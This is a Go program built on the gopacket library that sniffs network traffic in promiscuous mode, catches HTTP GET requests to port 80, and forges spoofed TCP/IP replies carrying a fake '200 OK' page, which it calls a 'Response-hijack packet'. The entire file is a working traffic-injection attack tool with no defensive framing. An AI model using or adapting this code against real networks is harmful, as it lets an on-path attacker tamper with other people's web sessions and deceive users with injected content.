package main

import (
	"flag"
	"fmt"
	_ "github.com/google/gopacket/dumpcommand"
	"github.com/google/gopacket/examples/util"
	"github.com/google/gopacket/pcap"
	"log"
	"os"
	"strings"
	"time"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

var iface = flag.String("i", "eth0", "Interface to read packets from")
var fname = flag.String("r", "", "Filename to read from, overrides -i")
var snaplen = flag.Int("s", 65536, "Snap length (number of bytes max to read per packet")
var tstype = flag.String("timestamp_type", "", "Type of timestamps to use")
var promisc = flag.Bool("promisc", true, "Set promiscuous mode")

func main() {
	defer util.Run()()
	var handle *pcap.Handle
	var err error
	if *fname != "" {
		if handle, err = pcap.OpenOffline(*fname); err != nil {
			log.Fatal("PCAP OpenOffline error:", err)
		}
	} else {
		// This is a little complicated because we want to allow all possible options
		// for creating the packet capture handle... instead of all this you can
		// just call pcap.OpenLive if you want a simple handle.
		inactive, err := pcap.NewInactiveHandle(*iface)
		if err != nil {
			log.Fatal("could not create: %v", err)
		}
		defer inactive.CleanUp()
		if err = inactive.SetSnapLen(*snaplen); err != nil {
			log.Fatal("could not set snap length: %v", err)
		} else if err = inactive.SetPromisc(*promisc); err != nil {
			log.Fatal("could not set promisc mode: %v", err)
		} else if err = inactive.SetTimeout(time.Second); err != nil {
			log.Fatal("could not set timeout: %v", err)
		}
		if *tstype != "" {
			if t, err := pcap.TimestampSourceFromString(*tstype); err != nil {
				log.Fatalf("Supported timestamp types: %v", inactive.SupportedTimestamps())
			} else if err := inactive.SetTimestampSource(t); err != nil {
				log.Fatalf("Supported timestamp types: %v", inactive.SupportedTimestamps())
			}
		}
		inactive.SetImmediateMode(true)
		if handle, err = inactive.Activate(); err != nil {
			log.Fatal("PCAP Activate error:", err)
		}
		defer handle.Close()
		if len(flag.Args()) > 0 {
			bpffilter := strings.Join(flag.Args(), " ")
			fmt.Fprintf(os.Stderr, "Using BPF filter %q\n", bpffilter)
			if err = handle.SetBPFFilter(bpffilter); err != nil {
				log.Fatal("BPF filter error:", err)
			}
		}
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet:= range packetSource.Packets() {
		if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
			if tcpLayer.(*layers.TCP).DstPort != 80 {
				continue
			}
			if tcpLayer.(*layers.TCP).SYN || tcpLayer.(*layers.TCP).RST {
				continue
			}
			data := string(tcpLayer.(*layers.TCP).LayerPayload())
			if !strings.HasPrefix(data, "GET") {
				continue
			}
			fmt.Println("I got GET packet!")
			ethLayer := packet.Layer(layers.LayerTypeEthernet)
			eth := layers.Ethernet{
				SrcMAC:       ethLayer.(*layers.Ethernet).DstMAC,
				DstMAC:       ethLayer.(*layers.Ethernet).SrcMAC,
				EthernetType: layers.EthernetTypeIPv4,
			}
			ipv4Layer := packet.Layer(layers.LayerTypeIPv4)
			ipv4 := layers.IPv4{
				Version: ipv4Layer.(*layers.IPv4).Version,
				SrcIP: ipv4Layer.(*layers.IPv4).DstIP,
				DstIP: ipv4Layer.(*layers.IPv4).SrcIP,
				TTL: 77,
				Id: ipv4Layer.(*layers.IPv4).Id,
				Protocol: layers.IPProtocolTCP,
			}
			tcp := layers.TCP{
				SrcPort: tcpLayer.(*layers.TCP).DstPort,
				DstPort: tcpLayer.(*layers.TCP).SrcPort,
				PSH: true,
				ACK: true,
				FIN: true,
				Seq: tcpLayer.(*layers.TCP).Ack,
				Ack: tcpLayer.(*layers.TCP).Seq + uint32(len(data)),
				Window: 0,
			}
			tcp.SetNetworkLayerForChecksum(&ipv4)
			data =
			`HTTP/1.1 200 OK
Server: nginx
Date: Tue, 26 Jan 2016 13:09:19 GMT
Content-Type: text/plain;charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
Cache-Control: no-store
Pragrma: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Cache-Control: no-cache
Content-Length: 7

Stupid!`

			// Set up buffer and options for serialization.
			buf := gopacket.NewSerializeBuffer()
			opts := gopacket.SerializeOptions{
				FixLengths:       true,
				ComputeChecksums: true,
			}
			if err := gopacket.SerializeLayers(buf, opts, &eth, &ipv4, &tcp, gopacket.Payload([]byte(data))); err != nil {
				fmt.Println(err)
			}
			if err := handle.WritePacketData(buf.Bytes()); err != nil {
				fmt.Println(err)
			}
			fmt.Println("I sent Response-hijack packet!")
		}
	}
	// dumpcommand.Run(handle)
}